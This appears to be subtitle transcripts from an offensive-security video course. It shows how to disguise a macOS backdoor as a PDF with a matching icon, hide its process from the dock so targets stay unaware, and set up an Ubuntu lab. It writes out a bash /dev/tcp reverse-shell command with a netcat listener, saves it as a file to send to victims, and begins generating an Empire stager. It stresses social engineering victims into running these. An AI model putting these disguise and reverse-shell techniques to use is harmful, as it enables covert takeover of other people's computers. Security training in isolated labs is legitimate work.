00:01:42,080 --> 00:01:48,110
So depending on the file that we're trying to mimic, you might have to take a screenshot like I did.

24
00:01:48,110 --> 00:01:55,850
But if you're mimicking something simple like a video or an image, or an MP3 file or even a word document,

25
00:01:55,850 --> 00:02:00,230
then you can just use the generic icon for that file type.

26
00:02:00,410 --> 00:02:06,470
And like I showed you before, you can use the website icon finder to find an icon that's appropriate

27
00:02:06,470 --> 00:02:07,370
for your file.

28
00:02:08,240 --> 00:02:13,610
Now, once you have the image that you want to use, and I have this one that I created, like I said

29
00:02:13,610 --> 00:02:21,530
before, you need to convert this image to a dot icns extension because that's the extension that Mac

30
00:02:21,560 --> 00:02:23,210
uses for its icons.

31
00:02:23,390 --> 00:02:28,550
So I have the file right here, and we're going to use this online service, and I'm going to include

32
00:02:28,550 --> 00:02:30,560
its URL in the resources.

33
00:02:30,710 --> 00:02:33,890
So I'm literally just going to drag and drop my image.

34
00:02:37,350 --> 00:02:47,130
Once this is done, download the Finder Ready icon and I have my Finder ready icon right here so we

35
00:02:47,130 --> 00:02:48,240
can use this icon.

36
00:02:48,240 --> 00:02:51,810
Now all I have to do is go back to my code.

37
00:02:51,810 --> 00:02:53,940
So this is the code that we used before.

38
00:02:53,940 --> 00:02:55,650
I'm going to copy all of it.

39
00:02:55,920 --> 00:02:58,110
And then I'm going to go to file.

40
00:02:58,910 --> 00:03:03,650
New from template and we're going to use cocoa applet.

41
00:03:07,200 --> 00:03:09,780
We're going to paste everything that we just copied.

42
00:03:10,710 --> 00:03:18,810
Then I'm going to click on this icon right here, which will allow me to modify the bundle info for

43
00:03:18,810 --> 00:03:19,650
this app.

44
00:03:19,920 --> 00:03:25,140
The first thing that you'll see in here is something called applet icons.

45
00:03:25,170 --> 00:03:29,370
This is the default icon that's going to be used with this application.

46
00:03:29,370 --> 00:03:30,840
So we don't want that.

47
00:03:30,840 --> 00:03:32,130
We want to get rid of it.

48
00:03:32,130 --> 00:03:36,660
Before I delete it I'm going to right click rename.

49
00:03:37,510 --> 00:03:38,770
And copy its name.

50
00:03:38,770 --> 00:03:40,480
So I'm going to do cmd and C.

51
00:03:41,730 --> 00:03:44,490
Then I'm going to right click delete.

52
00:03:45,320 --> 00:03:46,790
And that's gone.

53
00:03:46,790 --> 00:03:50,930
Now I'm going to drag and drop the icon that I just created.

54
00:03:52,470 --> 00:03:54,270
Then I'm going to right click it.

55
00:03:54,630 --> 00:03:55,800
Rename it.

56
00:03:56,460 --> 00:03:59,160
And paste the name that we copied before.

57
00:03:59,160 --> 00:04:01,740
So it was applet dot Icns.

58
00:04:02,700 --> 00:04:04,980
Hit enter and that's it.

59
00:04:04,980 --> 00:04:07,590
Now we're going to build the application or compile it.

60
00:04:07,590 --> 00:04:09,120
So we're going to go to file.

61
00:04:10,320 --> 00:04:11,160
Export.

62
00:04:12,450 --> 00:04:17,790
I'm gonna write my name in here, and let's just call it research.

63
00:04:18,240 --> 00:04:23,580
And I'm going to untick this just to make sure that no screens will be shown to the person other than

64
00:04:23,580 --> 00:04:25,680
the PDF that we want them to see.

65
00:04:26,190 --> 00:04:29,760
I'm going to click on save and that's done.

66
00:04:30,090 --> 00:04:31,920
Now have a look on these files.

67
00:04:31,920 --> 00:04:34,980
Now this is the actual PDF.

68
00:04:34,980 --> 00:04:36,360
So this is not a backdoor.

69
00:04:36,360 --> 00:04:42,750
This is the raw PDF downloaded from the website from the sample PDF website.

70
00:04:42,750 --> 00:04:45,900
If we run it we just get a normal PDF.

71
00:04:45,900 --> 00:04:47,910
We don't get a shell, we don't get anything.

72
00:04:48,720 --> 00:04:49,620
Seen here.

73
00:04:49,620 --> 00:04:50,790
We didn't get anything.

74
00:04:51,940 --> 00:04:53,590
And this file right here.

75
00:04:53,590 --> 00:04:55,510
This is our backdoor.

76
00:04:55,630 --> 00:05:00,280
And if you compare the two, they really look very very similar.

77
00:05:00,280 --> 00:05:02,470
So they have the same icon.

78
00:05:02,470 --> 00:05:07,960
And with OS x the extension the file extension is actually not very important.

79
00:05:07,960 --> 00:05:13,840
So sending the file like this will not make people suspicious because they're used to open files without

80
00:05:13,840 --> 00:05:14,680
extension.

81
00:05:14,680 --> 00:05:21,640
So even this PDF file the normal one, if you delete its extension, its dot pdf, it will still going

82
00:05:21,640 --> 00:05:22,300
to work.

83
00:05:24,500 --> 00:05:29,180
And now the file looks exactly the same as the original PDF.

84
00:05:29,180 --> 00:05:32,300
Like a normal PDF, it has a preview of the PDF.

85
00:05:32,300 --> 00:05:35,690
When you double click it, it will show you a PDF.

86
00:05:35,690 --> 00:05:43,520
But if we go to the hacker machine, you'll see that we managed to connect to the computer and we can

87
00:05:43,520 --> 00:05:44,750
interact with it.

88
00:05:46,560 --> 00:05:50,940
And basically hack it and do anything we want on the target computer.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


1

00:00:00,980  -->  00:00:04,400
Now, the backdoor that we created so far is really cool.

2

00:00:04,880  -->  00:00:08,100
We can see that I have a proper PDF in here

3

00:00:08,660  -->  00:00:10,980
and I have a backdoor here called research.

4

00:00:11,640  -->  00:00:14,640
And looking at them we can see that they're identical.

5

00:00:15,320  -->  00:00:18,860
They both have a preview of what's inside that file.

6

00:00:19,620  -->  00:00:24,540
If I double click my backdoor it will show me the file that I'm expecting as a user

7

00:00:25,160  -->  00:00:28,600
and at the same time it will connect to Empire in here

8

00:00:28,920  -->  00:00:33,400
allowing the hacker or me to have full access over that computer.

9

00:00:35,440  -->  00:00:39,040
The only problem right now is if you look at the status bar,

10

00:00:39,560  -->  00:00:44,218
you'll see when we executed the backdoor it created two processes.

11

00:00:44,740  -->  00:00:48,140
So it created a process here, which is called the research

12

00:00:48,700  -->  00:00:52,560
and that's actually the process for the backdoor itself.

13

00:00:52,720  -->  00:00:57,420
So this is the process that connected to my computer and it's allowing me to hack that computer

14

00:00:58,480  -->  00:01:05,280
and at the same time we see a preview here and this is the PDF that the backdoor downloaded.

15

00:01:06,280  -->  00:01:12,320
So if I right click this and quit, it will close my PDF

16

00:01:12,860  -->  00:01:16,220
but you'll see I still have a process in here called research.

17

00:01:17,420  -->  00:01:20,480
Now, this is actually not very suspicious to Mac users

18

00:01:20,640  -->  00:01:23,320
because usually when you close something with Mac,

19

00:01:23,820  -->  00:01:28,340
if you don't right-click and quit it it'll still have a dot in here at the bottom

20

00:01:28,460  -->  00:01:30,820
to indicate that this process is still working.

21

00:01:31,320  -->  00:01:36,040
For example, if I open Firefox now and then close it.

22

00:01:37,460  -->  00:01:44,000
You'll see I still have a dot for Firefox, which means it's still running. I still didn't do right click and quit.

23

00:01:44,840  -->  00:01:47,820
So having this dot and here is still not very suspicious

24

00:01:47,900  -->  00:01:51,140
but when you double click this file it opens up two processes.

25

00:01:51,460  -->  00:01:55,440
Two things will show up in the status bar and I really don't like that

26

00:01:55,440  -->  00:02:00,240
because if the target person notices that they might get a bit suspicious.

27

00:02:01,260  -->  00:02:07,660
So what I want to show you in this lecture is how to make our backdoor run with one process

28

00:02:07,660  -->  00:02:12,600
and hide the process that spawns the connection back to our computer.

29

00:02:13,080  -->  00:02:16,320
So you'll only see one process, which is the one for the PDF.

30

00:02:17,940  -->  00:02:19,540
Doing this is very, very simple.

31

00:02:20,340  -->  00:02:21,940
First of all I'm gonna quit this

32

00:02:24,420  -->  00:02:29,620
and then in my, in here in Empire, I'm just gonna kill the backdoor.

33

00:02:29,620  -->  00:02:36,920
So I'm just gonna go to agents and I'm gonna do 'kill all' just to kill my connection to that computer.

34

00:02:37,940  -->  00:02:40,440
So if I do list now, I should have nothing.

35

00:02:41,200  -->  00:02:42,060
Okay, that's perfect!

36

00:02:42,160  -->  00:02:45,960
I'm gonna do 'back' and I have zero agents right now.

37

00:02:47,460  -->  00:02:53,220
Now to hide this application, to hide my backdoor from the status bar or from the doc,

38

00:02:53,900  -->  00:02:58,600
all you have to do is right-click this, Show Package Contents

39

00:02:59,220  -->  00:03:03,320
and this will show you the contents of our application that we created.

40

00:03:04,340  -->  00:03:05,700
I'm gonna go on contents

41

00:03:08,420  -->  00:03:11,900
and then you wanna open the info.plist file.

42

00:03:13,400  -->  00:03:17,640
This is a file that's included in every application in OS X

43

00:03:17,640  -->  00:03:21,160
and it contains the properties for that application.

44

00:03:22,100  -->  00:03:26,540
So I'm gonna double click this file and it's gonna automatically open in my text editor.

45

00:03:27,220  -->  00:03:32,780
Let me zoom in on this and what we want to do is we want to add a key entry.

46

00:03:33,140  -->  00:03:37,480
So deep the properties in this file are stored as keys.

47

00:03:38,220  -->  00:03:43,775
So you can see we have a key tag, which means this is a key for the file

48

00:03:44,240  -->  00:03:50,420
and then you see a string, which basically specifies the property, the value of the property.

49

00:03:51,180  -->  00:03:57,840
So you can for example think of this as the property name and this in here is a property value.

50

00:03:58,780  -->  00:04:02,580
So we're gonna do we're gonna add a key, so a name and a value.

51

00:04:03,020  -->  00:04:06,520
The same way that there are existing properties now.

52

00:04:06,920  -->  00:04:08,940
So we're gonna do key

53

00:04:11,200  -->  00:04:15,420
and then the name of this key is gonna be 'NSUIELEMENT'.

54

00:04:18,480  -->  00:04:23,573
And close that tag usually when you do forward slash, the tag name would close it

55

00:04:24,240  -->  00:04:28,880
and make sure you spell this properly because it is case-sensitive.

56

00:04:29,240  -->  00:04:32,580
So the capital letters need to be capital and the small letters need to be small.

57

00:04:33,160  -->  00:04:39,320
So this is the name of the property that we want to modify and the name of it is 'NSUIELEMENT

58

00:04:40,020  -->  00:04:43,560
and the value that we want to set for this is going to be.

59

00:04:43,980  -->  00:04:51,716
So we have to type string first to set the value and the value is going to be one and then close this.

60

00:04:53,680  -->  00:04:58,720
So basically we're adding a property, we're setting a property called 'NSUIELEMENT'.

61

00:04:59,280  -->  00:05:02,640
And we're saying that we want to set this to a value of one

62

00:05:03,340  -->  00:05:08,640
and basically, what this is gonna do, it's gonna tell Mac iOS  that for this application,

63

00:05:08,640  -->  00:05:12,380
don't show an icon in the dock in here at the bottom.

64

00:05:12,960  -->  00:05:17,420
So when we execute this, the script will not have an icon in the dock

65

00:05:17,780  -->  00:05:23,720
and the only icon you'll see is for the second process, which is the one that will open the PDF file

66

00:05:23,720  -->  00:05:28,260
or the song or whatever file you are trying to mimic in your example.

67

00:05:29,180  -->  00:05:30,360
So that's it.

68

00:05:30,360  -->  00:05:34,420
I did CMD and S to save it and I'm gonna close it and I'm done.

69

00:05:34,420  -->  00:05:40,660
I'm gonna go back to my downloads and I'm gonna execute the file, double-click.

70

00:05:45,000  -->  00:05:50,940
Now, as you can see I got only one icon in here and my dock and that opened the PDF for me

71

00:05:51,580  -->  00:05:56,220
and basically when I quit this, it will disappear from here.

72

00:05:56,880  -->  00:06:02,600
Nothing is showing but if we come here, we have our connection, which we can interact with

73

00:06:04,520  -->  00:06:09,680
and we can basically do all the post exploitation things that you're going to learn later on.

74

00:06:10,020  -->  00:06:14,000
which basically means you have full control over this computer.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 13: Linux Malware

1
00:00:00,000 --> 00:00:03,540
In this section, we're going to be creating malware for Linux.

2
00:00:03,540 --> 00:00:10,590
And before jumping into this, we're going to learn how to create a virtual machine that runs on Linux.

3
00:00:11,160 --> 00:00:17,790
There are a number of Linux distributions we're going to be installing the most popular one called Ubuntu.

4
00:00:17,820 --> 00:00:23,880
We have it right here, but if you test an attack and it works against ubuntu which is based on Debian,

5
00:00:23,910 --> 00:00:30,330
then it will definitely work on all of Debian distributions and it will work on all linux distributions

6
00:00:30,330 --> 00:00:32,070
with a bit of tweaking.

7
00:00:32,070 --> 00:00:35,910
So I'm going to include this download link in the resources of this lecture.

8
00:00:35,910 --> 00:00:40,250
Once you have it you're just going to click on download and here to download it.

9
00:00:40,260 --> 00:00:46,650
The download might take some time, so I've already downloaded it in here and I have it in my downloads

10
00:00:46,650 --> 00:00:52,260
and we have the downloaded file in here as you can see, and it has a dot ISO format.

11
00:00:52,260 --> 00:00:58,530
So unlike all of the previous machines that we installed, the downloaded file was actually a file that

12
00:00:58,530 --> 00:01:00,570
is designed to work with VMware.

13
00:01:00,600 --> 00:01:02,280
It's a virtual image file.

14
00:01:02,280 --> 00:01:10,470
This time we're downloading the actual ISO that you need to burn on a disk or flash to a USB stick to

15
00:01:10,470 --> 00:01:12,060
install the operating system.

16
00:01:12,060 --> 00:01:18,420
So once you start this in VMware, the installation process is going to be identical to installing it

17
00:01:18,420 --> 00:01:21,390
as a main operating system on your computer.

18
00:01:21,390 --> 00:01:23,250
So let's see how we're going to do that.

19
00:01:23,250 --> 00:01:29,340
First of all, I'm going to open up my VMware and I'm going to click on Create a new virtual Machine.

20
00:01:29,340 --> 00:01:34,710
Or you can simply go to player file and new virtual machine.

21
00:01:35,430 --> 00:01:39,270
We're going to say that I have an installer disk image ISO.

22
00:01:39,300 --> 00:01:40,950
This is what we just downloaded.

23
00:01:40,950 --> 00:01:43,020
This is this ISO right here.

24
00:01:43,200 --> 00:01:47,160
So we're simply going to click on the browse and locate this file.

25
00:01:47,160 --> 00:01:50,700
I have it in my downloads and this is it right here.

26
00:01:50,880 --> 00:01:54,870
I'm going to click on Open and we'll click on next.

27
00:01:54,900 --> 00:01:57,840
Now VMware is asking us for our full name.

28
00:01:57,840 --> 00:02:02,760
You can use any name, so I'm just going to say John username again, we're set it to John.

29
00:02:02,760 --> 00:02:06,390
We'll set the password, click on next.

30
00:02:06,390 --> 00:02:09,060
Then it's going to ask us for the virtual machine name.

31
00:02:09,060 --> 00:02:13,950
It automatically detected that this is going to be a ubuntu machine, so I'm going to keep it the way

32
00:02:13,950 --> 00:02:14,430
it is.

33
00:02:14,460 --> 00:02:18,720
And then it's given us the location where this virtual machine is going to be stored.

34
00:02:18,720 --> 00:02:19,650
I'm happy with that.

35
00:02:19,650 --> 00:02:23,460
So I'm keeping it the same and we're going to click on next to continue.

36
00:02:23,640 --> 00:02:27,930
It's asking us for the maximum disk size for this virtual machine.

37
00:02:27,930 --> 00:02:30,330
Keep in mind this is the maximum disk size.

38
00:02:30,330 --> 00:02:36,220
So when you set this to 20 gigs, for example, as you can see in here, it's not going to take 20 gigs

39
00:02:36,220 --> 00:02:37,690
of your storage.

40
00:02:37,690 --> 00:02:41,230
It's only going to allow it to go up to 20 gigs.

41
00:02:41,230 --> 00:02:46,570
It'll only take as much as it needs out of it up to 20GB.

42
00:02:46,810 --> 00:02:49,900
So we're going to click on next keeping this the same.

43
00:02:49,900 --> 00:02:56,410
Now it's given us a breakdown of all of the configurations we're going to click on Customize Hardware.

44
00:02:56,410 --> 00:02:58,660
If you want to change the amount of memory that it's given.

45
00:02:58,660 --> 00:03:00,400
As you can see, it's given two gigs.

46
00:03:00,430 --> 00:03:06,580
If you're limited, you can reduce this using the slider to one gig because that should be enough processors

47
00:03:06,580 --> 00:03:07,090
as well.

48
00:03:07,090 --> 00:03:10,420
It has two by default, you can set it to one if you really want to.

49
00:03:10,420 --> 00:03:15,550
If you're stuck for resources, the main thing on the network, you want to make sure that it's set

50
00:03:15,550 --> 00:03:20,770
to use, not network, so that all of your virtual machines are connected to the same network so that

51
00:03:20,770 --> 00:03:25,900
they can communicate with with each other and you can practice the attacks against them.

52
00:03:26,320 --> 00:03:28,450
So everything looks fine in here.

53
00:03:28,450 --> 00:03:32,170
We're going to close this and we're going to click on Finish.

54
00:03:33,680 --> 00:03:36,590
You might get a pop up for the VMware tools in here.

55
00:03:36,590 --> 00:03:41,090
I'm going to say remind me later for now because we actually want to install the operating system first

56
00:03:41,090 --> 00:03:44,210
before doing that, give it some time to load.

57
00:03:45,340 --> 00:03:50,290
And as you can see, the installer is automatically copying files now to the virtual hard disk.

58
00:03:50,290 --> 00:03:51,160
So just give it.

59
00:03:51,160 --> 00:03:56,320
It's time to copy all of the files and install ubuntu for you as a virtual machine.

60
00:03:56,680 --> 00:04:01,950
Once the installation is complete, you'll notice that the machine will automatically restart.

61
00:04:01,960 --> 00:04:06,940
So just give it some time to boot into the newly installed operating system.

62
00:04:07,180 --> 00:04:10,750
And perfect as you can see you're going to get the login screen.

63
00:04:10,870 --> 00:04:16,720
As you can see here, the username is set to the username that we picked, which is JN.

64
00:04:16,750 --> 00:04:20,440
If I click on it, it's going to ask me for the password.

65
00:04:20,440 --> 00:04:24,520
I'm going to put the password and hit enter to log in.

66
00:04:26,230 --> 00:04:27,130
And perfect.

67
00:04:27,130 --> 00:04:32,120
As you can see, we have now this new Linux operating system installed.

68
00:04:32,140 --> 00:04:34,870
Now you're going to see the wizard to set it up at the start.

69
00:04:34,870 --> 00:04:37,480
So I'm going to be skipping most of these steps.

70
00:04:37,480 --> 00:04:43,060
So we're just going to be clicking next and we don't want it to share anything.

71
00:04:43,750 --> 00:04:49,570
Next, keep the services off, click on Done and Perfect.

72
00:04:49,600 --> 00:04:56,560
Now we are ready to use this new installation of Linux and we're going to be using it to test the Linux

73
00:04:56,560 --> 00:05:00,750
malware that we're going to be generating in this section.

74
00:05:00,760 --> 00:05:05,380
Now you can use this virtual machine and edit its settings similar to what we did with other virtual

75
00:05:05,380 --> 00:05:06,070
machines.

76
00:05:06,070 --> 00:05:09,040
So you can go in here and go into full screen.

77
00:05:09,040 --> 00:05:15,250
You can also modify the screen size and the screen settings similar to what we seen before, or go to

78
00:05:15,250 --> 00:05:16,840
settings and modify its settings.

79
00:05:16,840 --> 00:05:22,510
But you want to make sure it's connected to the same network and you're going to learn its basic usage

80
00:05:22,510 --> 00:05:24,070
as we go through this section.

81
00:05:24,070 --> 00:05:30,800
But for now, to turn it off, you can simply just click on this icon in here and click on Power Off.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,080  -->  00:00:04,900
Now, when it comes to targeting OS X and
Linux machines,

2

00:00:05,380  -->  00:00:08,960
we can actually generate evil files really, really easily,

3

00:00:09,180  -->  00:00:13,160
we can get a reverse shell using one command.

4

00:00:14,500  -->  00:00:20,400
This can be done because both OS X and Linux computers use Bash.

5

00:00:20,880  -->  00:00:27,400
Bash is the command language used by UNIX systems and that language is really, really powerful

6

00:00:27,500  -->  00:00:34,100
and we can use it to do so many things including getting a reverse shell, using a very, very simple command.

7

00:00:35,260  -->  00:00:39,060
Now, I'm going to show you this example on a Ubuntu Linux machine,

8

00:00:39,340  -->  00:00:43,120
but this will work on all operating systems that use Bash.

9

00:00:43,340  -->  00:00:50,100
So, that includes iOS, it includes OS X, it includes Android and Linux.

10

00:00:50,840  -->  00:00:54,240
So before I do anything, I just want to show you the Settings here.

11

00:00:54,520  -->  00:00:58,380
So, if we go on my Ubuntu machine settings,

12

00:00:59,740  -->  00:01:03,940
you'll see, if I go to the Networks, you'll see that is connected to a NAT Network

13

00:01:04,040  -->  00:01:06,660
and that network is '10.20.14-NAT'

14

00:01:07,300  -->  00:01:12,160
and if I go to my Kali machine, you'll see that it's connected to the same network.

15

00:01:16,620  -->  00:01:18,000
So, that's all good

16

00:01:18,260  -->  00:01:21,200
and in my Kali machine if I do 'ifconfig',

17

00:01:22,280  -->  00:01:26,160
you'll see my IP is '10.20.14.213'

18

00:01:26,480  -->  00:01:29,460
and if I go on my Ubuntu target machine,

19

00:01:29,880  -->  00:01:32,980
if I go on all programs and type 'terminal'.

20

00:01:36,640  -->  00:01:38,160
And then type 'ifconfig',

21

00:01:39,120  -->  00:01:43,440
you'll see that its IP is '10.20.14.221'.

22

00:01:43,680  -->  00:01:46,080
So, the first 3 parts of the IP are the same,

23

00:01:46,080  -->  00:01:50,140
which means that both computers are on the same subnet, of the same network

24

00:01:50,280  -->  00:01:52,920
and we can try to hack one of them from the other.

25

00:01:53,400  -->  00:01:56,800
Now, hacking external computers will be covered later on in the course.

26

00:01:57,000  -->  00:01:59,800
For now, we're focusing on computers on the same network

27

00:02:00,160  -->  00:02:03,220
because it's simpler to test the backdoors that way.

28

00:02:04,840  -->  00:02:08,980
Now, the command that we're gonna run is very, very simple.

29

00:02:09,280  -->  00:02:11,700
So, I'm just going to do 'clear' to clear the screen.

30

00:02:13,060  -->  00:02:16,140
And the command that we can use to get a reverse shell,

31

00:02:16,140  -->  00:02:19,140
which will give us full control over the target computer,

32

00:02:19,400  -->  00:02:27,860
is gonna be 'bash -i &gt;&amp; /dev/tcp'

33

00:02:28,100  -->  00:02:33,380
and then you want to put the IP of the attacker machine, so the IP of the Kali machine,

34

00:02:33,960  -->  00:02:36,640
so it's '10.20.14.213'.

35

00:02:37,780  -->  00:02:41,980
And then put the port that you want to connect on and let's use '8080'.

36

00:02:43,020  -->  00:02:46,420
And then we're gonna pipe that to the Kali machine as well.

37

00:02:48,460  -->  00:02:55,860
So basically, what this command is gonna do, it's gonna try to facilitate a TCP connection to this IP address,

38

00:02:55,860  -->  00:03:00,220
which is the IP address of my Kali machine on port '8080'.

39

00:03:00,920  -->  00:03:05,760
And it's going to wait for 'bash' commands through that pipe, through that connection

40

00:03:06,060  -->  00:03:12,340
and it will pipe the output to the computer that it's connected to,

41

00:03:13,020  -->  00:03:17,120
which basically, means that the Kali machine will be able to run bash commands

42

00:03:17,200  -->  00:03:20,820
and it will be able to send the commands and see the result.

43

00:03:21,780  -->  00:03:23,880
Now if I hit Enter, now nothing is going to happen

44

00:03:24,080  -->  00:03:27,980
because my Kali machine is not waiting for connections on 8080.

45

00:03:28,960  -->  00:03:33,300
So to do that, to wait for someone to connect to us here on 8080.

46

00:03:33,520  -->  00:03:42,500
All we have to do is just do 'nc -vv -l -p 8080'.

47

00:03:43,620  -->  00:03:46,880
So with this command, you're actually using a program called 'Netcat'

48

00:03:47,600  -->  00:03:51,180
and we're just telling it that we want to get some verbose output.

49

00:03:51,860  -->  00:03:54,620
So in case things go wrong, we'll know what's happening

50

00:03:55,100  -->  00:04:00,000
we're also telling it that we want to listen on a specific port

51

00:04:00,800  -->  00:04:03,820
and the port that we want to listen on, is port 8080.

52

00:04:05,260  -->  00:04:09,820
So basically, the command is very simple, all we're, we're doing is we're using a tool called Netcat.

53

00:04:10,200  -->  00:04:15,220
We're telling it to show us anything that happens, in case things go wrong, please tell me what's happening.

54

00:04:15,820  -->  00:04:18,980
We're telling it that we want to listen using the '-l'

55

00:04:19,360  -->  00:04:23,120
and we're telling it we want to listen on a specific port using the '-p'

56

00:04:23,400  -->  00:04:26,540
and the port that we, that we want to listen on is 8080.

57

00:04:27,480  -->  00:04:31,420
Now, this port is the same portal we're going to use here for the connection.

58

00:04:32,500  -->  00:04:33,880
So now when I hit Enter,

59

00:04:34,360  -->  00:04:37,840
you'll see Netcat saying, "I'm listening on port 8080".

60

00:04:39,680  -->  00:04:42,640
Now, once the target person execute this command.

61

00:04:43,520  -->  00:04:48,340
You'll see, we'll actually get a connection back in here, in my Kali machine

62

00:04:48,920  -->  00:04:54,300
and this will basically, allow me to run anything I want on the target computer, so I can see where I am,

63

00:04:54,740  -->  00:04:58,920
I can 'list' files, I can download and upload files using the Linux commands

64

00:04:58,920  -->  00:05:01,000
that we're gonna see later on in the course.

65

00:05:01,440  -->  00:05:07,880
So basically, you can do anything that the logged in user in here, can do using Bash commands

66

00:05:08,020  -->  00:05:10,260
and like I said, Bash is really, really powerful,

67

00:05:10,260  -->  00:05:14,960
so you can pretty much do anything you want on the system, if you know the right commands to use.

68

00:05:16,160  -->  00:05:21,580
Now, this is really handy because if you think of it the target person did not download anything,

69

00:05:21,980  -->  00:05:27,580
they did not execute anything, all they did is they ran a native command on the system.

70

00:05:28,040  -->  00:05:32,000
So they won't be very suspicious even, even though they're, they know,

71

00:05:32,000  -->  00:05:34,220
that they're running a command on their system.

72

00:05:34,540  -->  00:05:40,220
If the person is a novice person, they might be a, they might actually just execute this command for you,

73

00:05:40,280  -->  00:05:42,380
If you social engineer them properly.

74

00:05:42,560  -->  00:05:45,600
And we're going to have a few examples and a few ideas of this later on.

75

00:05:46,640  -->  00:05:50,420
What I also want to show you is, now if I just exit out of this,

76

00:05:52,780  -->  00:05:53,960
just to prove a point.

77

00:05:54,180  -->  00:05:56,660
Now if you want to send this as a file,

78

00:05:56,980  -->  00:05:59,240
you can literally just copy this code,

79

00:05:59,920  -->  00:06:01,200
open a text editor,

80

00:06:02,560  -->  00:06:04,300
so if we just go to 'gedit',

81

00:06:04,560  -->  00:06:07,080
that's the name of the text editor in Ubuntu

82

00:06:08,440  -->  00:06:10,100
and paste this in there

83

00:06:11,260  -->  00:06:15,200
and save this file, let's just call it anything we want, so we're gonna save it on the desktop.

84

00:06:16,760  -->  00:06:21,060
And we can just call it basic_reverse_shell,

85

00:06:21,760  -->  00:06:23,700
you don't even need to give it an extension.

86

00:06:24,580  -->  00:06:26,860
Now once you have this saved on the desktop,

87

00:06:27,120  -->  00:06:32,960
you can actually send this file to anyone you want, let's say, you created this file on your Kali machine

88

00:06:33,120  -->  00:06:35,020
and you send it to this person here.

89

00:06:35,580  -->  00:06:39,540
If they execute this file, again you'll get a reverse connection here.

90

00:06:40,040  -->  00:06:42,840
So, if i just listen again, on 8080

91

00:06:43,900  -->  00:06:45,880
and now I'm just gonna navigate to my desktop.

92

00:06:47,540  -->  00:06:49,200
If we 'ls' will see the file

93

00:06:49,620  -->  00:06:56,820
and now to execute a Bash file, you have to type in 'bash basic_reverse_shell'.

94

00:06:57,320  -->  00:07:02,220
And if we execute that, you'll see that we got our reverse shell in here again.

95

00:07:02,700  -->  00:07:10,200
So we can do 'pwd', we can list, we can get our 'id' or do anything we want on the target system,

96

00:07:10,340  -->  00:07:13,180
again we have the same privileges that this person has.

97

00:07:13,960  -->  00:07:17,760
Now, this again shows how powerful the Bash command is

98

00:07:17,960  -->  00:07:21,880
but at the same time shows, how limited we are when attacking Linux.

99

00:07:22,180  -->  00:07:28,320
I didn't show you this method when we were attacking Mac OS because using an 'applescript'

100

00:07:28,320  -->  00:07:34,480
and compiling that to an executable is much better as a method of social engineering

101

00:07:34,480  -->  00:07:38,020
because we've seen how we can manipulate this applescript

102

00:07:38,140  -->  00:07:41,240
and make it look like an image or a PDF or anything we want.

103

00:07:42,500  -->  00:07:47,180
The problem with Linux systems, if you're targeting a Linux computer,

104

00:07:48,000  -->  00:07:53,280
even if you are sending an executable here and even if you change the permissions to an executable.

105

00:07:53,440  -->  00:07:55,460
When the person downloads this file,

106

00:07:56,040  -->  00:07:57,300
if they double-click it,

107

00:07:57,580  -->  00:08:02,240
the file will open in a text editor, it will not get executed.

108

00:08:03,640  -->  00:08:07,400
It will never get executed unless the person execute it through the terminal.

109

00:08:08,240  -->  00:08:11,860
So, this is one important thing that you want to keep in mind with Linux systems.

110

00:08:12,480  -->  00:08:16,000
You can also use an e, an 'elf' extension,

111

00:08:16,260  -->  00:08:20,540
but not all systems support that and they might have to install libraries to run your file.

112

00:08:20,740  -->  00:08:22,940
So, again you're actually adding more complexity,

113

00:08:23,640  -->  00:08:24,800
but don't worry about this.

114

00:08:24,980  -->  00:08:29,720
We're going to talk about other methods of delivering the backdoors

115

00:08:29,720  -->  00:08:33,440
and how we can actually kind a enhance them and make them more acceptable.

116

00:08:34,460  -->  00:08:36,660
For now, I just wanted to show you this method

117

00:08:36,800  -->  00:08:42,560
because I think we-- if you can actually social engine, engineer this properly

118

00:08:42,820  -->  00:08:47,980
it can be a really, really handy way for you to gain access to other computers

119

00:08:47,980  -->  00:08:50,700
and like I said, this works with Linux OS X

120

00:08:50,860  -->  00:08:54,280
and all UNIX based machines, so that includes Android and iOS.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,260  -->  00:00:07,400
Okay. Now, so far we've seen how we can create a very basic UNIX based backdoor

2

00:00:07,400  -->  00:00:09,760
that will work on all UNIX operating systems.

3

00:00:11,020  -->  00:00:14,640
That backdoor will only allow us to run the Bash commands,

4

00:00:14,640  -->  00:00:18,460
so the commands that you can lit-- that you can easily run through the terminal.

5

00:00:18,960  -->  00:00:23,220
Now that's a lot, that's pretty much will allow us to do anything we want on the system,

6

00:00:23,620  -->  00:00:25,760
but if you want more features,

7

00:00:25,960  -->  00:00:29,060
then you'd want to use an Empire backdoor

8

00:00:29,160  -->  00:00:32,820
or  l--Metasploit backdoor like a Meterpreter backdoor.

9

00:00:33,740  -->  00:00:39,060
What I want to show you today is using Empire and why I'm focusing on Empire is,

10

00:00:39,060  -->  00:00:46,200
because the whole framework in Empire is built around generating backdoors and receiving connections.

11

00:00:46,500  -->  00:00:48,600
So it's really, really handy, like you can see now

12

00:00:48,760  -->  00:00:52,420
as soon as I logged in, as soon as I ran Empire,

13

00:00:52,660  -->  00:00:58,040
you can see that I already have my listeners unlike Metasploit, you'll have to create your,

14

00:00:58,040  -->  00:01:01,960
you'll have to create your multi/handler and execute it or have it saved.

15

00:01:02,500  -->  00:01:05,520
For now, you can see that I'm already have my 2 listeners running

16

00:01:06,020  -->  00:01:09,620
and these listeners, like I said before, are generic.

17

00:01:10,120  -->  00:01:13,440
So, we don't have to create a listener for each backdoor.

18

00:01:13,740  -->  00:01:16,400
We can use the already existing listeners

19

00:01:16,640  -->  00:01:22,140
for any cong-- for any target that we want, as long as the IPs in there, are correct.

20

00:01:22,940  -->  00:01:27,260
So, I actually have two listeners because one is for the network that's used in VirtualBox

21

00:01:27,820  -->  00:01:31,560
and that will work for any computer that's installed in VirtualBox for me.

22

00:01:32,200  -->  00:01:35,880
And the next listener is the one that I used when I was targeting the iOS,

23

00:01:36,000  -->  00:01:38,560
when I was targeting the Mac OS machine.

24

00:01:39,440  -->  00:01:44,880
So with Empire, you can use the same listeners and they work against all operating systems,

25

00:01:45,120  -->  00:01:47,880
the only thing that changes is the stager.

26

00:01:48,820  -->  00:01:54,360
So for now, all we have to do is just generate a new stager for a Linux computer.

27

00:01:55,160  -->  00:01:59,660
So, we're going to use the same command that we always use and that's going to be 'usestager'.

28

